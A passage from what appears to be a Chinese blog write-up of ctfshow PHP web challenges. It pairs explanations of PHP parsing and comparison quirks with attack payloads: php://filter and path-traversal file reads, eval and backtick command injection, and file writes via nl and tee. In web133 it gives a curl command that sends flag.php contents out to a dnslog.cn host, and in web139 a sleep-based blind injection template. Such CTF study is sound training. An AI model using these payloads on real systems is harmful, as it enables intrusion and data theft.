判断给定文件名是否为一个正常的文件 </span><br><span class="line">is_file ( string $filename ) : bool</span><br></pre></td></tr></table></figure><p>显然不能让is_file函数检测出文件，又要highlight_file显示文件</p><p>那么我们可以使用php伪协议</p><p>payload：file=php://filter/resource=flag.php</p><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041748321.png" alt="chrome_1mq0dye4nS"></p><p>把filter过滤了，在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041748444.png" alt="chrome_2woolNjJnf"></p><p>又把filter放出来了，那就直接出</p><p>payload：file=php://filter/resource=flag.php</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041748849.png" alt="chrome_aZATZb9wVO"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数描述</span><br><span class="line">string        必需。规定要检查的字符串。</span><br><span class="line">charlist    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - 制表符</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - 换行</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - 垂直制表符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - 回车</span><br><span class="line"><span class="string">&quot; &quot;</span>        - 空格</span><br></pre></td></tr></table></figure><p>写一个测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(trim(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现除了±.号以外还有只剩下%0c也就是换页符了</p><p>所以payload：num=%0c36</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041748524.png" alt="chrome_dOBlWnxqi8"></p><p>审计审计</p><p>羽师傅的新姿势</p><p><code>isset($_POST[&#39;CTF_SHOW.COM&#39;])</code>因为php变量命名是不允许使用点号的</p><p>模拟post传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init(); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> strlen(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;=<span class="number">128</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.urlencode(chr(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(curl(<span class="variable">$url</span>,<span class="variable">$data</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>test.php中的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果<br><code>CTF%5BSHOW.COM=123</code></p><p>又一姿势</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line">第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line">设置register_argc_argv = On(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果</span><br><span class="line">这时候的<span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]</span><br><span class="line"><span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br></pre></td></tr></table></figure><p>我们是在网页模式下运行的，所以$SERVER[‘argv’][0] = $SERVER[‘QUERY_STRING’]也就是$a[0]= $_SERVER[‘QUERY_STRING’]</p><p>$_SERVER[“QUERY_STRING”] 获取查询语句，获取的是?后面的值</p><p>a[0]对应的就是get中的结果</p><p>这时候我们只要通过 eval(“$c”.”;”);将$flag赋值flag_give_me就可以了</p><p>payload: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041749883.png" alt="chrome_jiOr3XvL3e"></p><p>和上一题基本一样，过滤了一些东西，不影响操作</p><p>payload: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>题目给的hint也比较好理解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:<span class="number">1</span>=flag.php </span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041749248.png" alt="chrome_XW87RTD312"></p><p>和上一题基本一样，过滤了一些东西，不影响操作</p><p>payload: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041749617.png" alt="chrome_Dl5Rm8jFAT"></p><p>过滤了下划线和中括号</p><p>模拟传参测试出可以替代的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/flag.php?ctf&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(curl(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现以下字符等同于ctf_show</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ _ [ .  </span><br><span class="line">+  这里的加号在url中起到空格的作用</span><br></pre></td></tr></table></figure><p>除去他过滤掉的 _ . [ 我们发现我们还可以用空格实现</p><p>payload：ctf show=ilove36d</p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041750438.png" alt="image-20211113171135398"></p><p>直接上姿势了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func — 把第一个参数作为回调函数调用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars ( void ) : array </span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure><p>payload：f1=_&amp;f2=get_defined_vars</p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041750220.png" alt="image-20211113172042516"></p><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">相关函数：</span><br><span class="line"><span class="selector-attr">[strpos()]</span> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line"><span class="selector-attr">[strripos()]</span> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br><span class="line"><span class="selector-attr">[strrpos()]</span> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</span><br></pre></td></tr></table></figure><p>题目hint给到了目录穿越</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：f=/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><p>羽师傅用伪协议绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>![image-20211113172713166](C:/Users/23627/Pictures/Saved Pictures/image-20211113172713166.png)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.+?`意思是，在ctfshow字符串前面有至少一个字符</span><br><span class="line">/iss是匹配换行</span><br></pre></td></tr></table></figure><p>payload：f=ctfshow</p><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041750261.png" alt="image-20211113173127022"></p><p>利用正则最大回溯次数绕过</p><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://27574079-8974-467c-bc5e-17d6b9cc7c6d.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041751478.png" alt="image-20211127175952923"></p><p>一看就是虚假的前端，robots协议泄露/admin，在网址后面输入/admin进入源码界面</p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041751037.png" alt="image-20211127181844899"></p><ul><li>松散比较：<code>==</code>比较时先转数据类型再进行比较</li><li>严格比较：<code>===</code> 比较时先判断两种字符串类型是否相等，再进行比较<br>例：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || ture)</span><br></pre></td></tr></table></figure><p>因为 &amp;&amp; 的优先级大于 ||，所以就相当于 (false &amp;&amp; false) || ture，只要后边是true就行</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=admin&amp;password=<span class="number">1</span>&amp;code=admin</span><br></pre></td></tr></table></figure><p>不解释太清楚了，学到这里该懂了</p><h2 id="web133-无回显rce"><a href="#web133-无回显rce" class="headerlink" title="web133-无回显rce"></a>web133-无回显rce</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041751739.png" alt="image-20211127185417656"></p><p>看代码</p><p>我们传递</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;sleep 3</span><br></pre></td></tr></table></figure><p>好像网站确实sleep了一会说明的确执行了命令</p><p>它先进行substr()函数截断, 经过substr($F,0,6)截取后 得到  `$F `;<br>然后去执行eval()函数,也就是会执行 eval(“`$F `;”);<br>这个函数的作用是执行php代码，是shell_exec()函数的缩写，然后就去命令执行。<br>而$F就是我们输入的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$F `;+sleep 3 </span><br></pre></td></tr></table></figure><p>所以最后执行的代码应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec(&quot;`$F `;sleep 3&quot;);</span><br></pre></td></tr></table></figure><p>就突破长度限制执行成功,由于无回显，利用curl去带出flag.<a href="https://so.csdn.net/so/search?q=php&spm=1001.2101.3001.7020">php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：F=`<span class="variable">$F</span>`; curl `cat flag.php|grep <span class="string">&quot;flag&quot;</span>`.a0b651.dnslog.cn</span><br></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041751721.png" alt="image-20220302154737630"></p><p>parse_str() 函数把查询字符串解析到变量中。</p><p>$_SERVER[“QUERY_STRING”]</p><p>说明：查询(query)的字符串</p><p>extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041752611.png" alt="image-20220302155428801"></p><p>web133加强版，过滤了curl，grep，之前的方法用不了</p><p>看了羽师傅博客发现没有限制写文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:F=`$F `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure><p>这个命令组合实现的效果就是将flag.php的内容复制到xxx文件中，访问/xxx即可得到flag</p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041752356.png" alt="image-20220302185137867"></p><p>这道题135的基础上多过滤了 &gt;&lt;<br>但是linux中还可以用tee写文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|tee xxx</span><br></pre></td></tr></table></figure><p>我们先来看下当前目录下有啥文件，访问url/xxx发现只有一个index.php<br>那我们再去看看根目录下有什么文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /|tee xxx</span><br></pre></td></tr></table></figure><p>得到 f149_15_h3r3<br>最后直接打开就可以了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl  /f149_15_h3r3|tee xxx</span><br></pre></td></tr></table></figure><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041752482.png" alt="image-20220302185633851"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line"></span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ctfshow=ctfshow::getflag</span><br></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041752732.png" alt="image-20220302185911047"></p><p>同上一题，多过滤了冒号</p><p>call_user_func中不但可以传字符串也可以传数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">call_user_func(<span class="variable">$classname</span> .<span class="string">&#x27;::say_hello&#x27;</span>); <span class="comment">// As of 5.2.3</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myobject</span> = <span class="keyword">new</span> myclass();</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$myobject</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上例程会输出：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">Hello!</span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h2 id="web139-脚本问题？？？"><a href="#web139-脚本问题？？？" class="headerlink" title="web139(脚本问题？？？)"></a>web139(脚本问题？？？)</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041753120.png" alt="image-20220302190624722"></p><p>在136的基础上限制了写文件的权限，这时候可以考虑用盲打的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AWK:是一种处理文本文件的语言，是一个强大的文本分析工具 </span><br><span class="line">NR:已经读出的记录数，就是行号，从1开始</span><br><span class="line"></span><br><span class="line">cut:命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</span><br><span class="line">-c ：以字符为单位进行分割。</span><br></pre></td></tr></table></figure><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041753833.png" alt="image-20220302194944923"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure><p>弱类型比较，只要让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(phpinfo()) </span><br><span class="line">md5(sleep()) </span><br><span class="line">md5(md5()) </span><br><span class="line">current(localeconv) </span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的为数字所以我们改用sha1</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：f1=md5&amp;f2=md5</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041753826.png" alt="image-20220302195947529"></p><p><code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure><p>会发现无法执行命令的，但是php数字是可以和命令进行一些运算的，例如 